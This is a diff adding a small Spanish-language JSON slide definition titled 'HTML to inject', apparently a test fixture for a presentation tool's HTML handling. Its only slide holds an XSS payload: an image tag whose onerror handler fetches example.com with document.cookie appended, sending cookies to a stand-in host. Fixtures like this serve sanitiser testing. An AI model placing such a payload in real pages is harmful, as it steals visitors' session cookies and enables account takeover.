@@ -1,0 +1,13 @@
+{
+  "version": 1,
+  "idioma": "es",
+  "titulo": "HTML para inyectar",
+  "secciones": [
+    {
+      "id": "html",
+      "titulo": "HTML",
+      "segundos": 3,
+      "diapositiva": { "tipo": "html", "html": "<img src=x onerror=\"fetch('https://example.com/'+document.cookie)\">" }
+    }
+  ]
+}
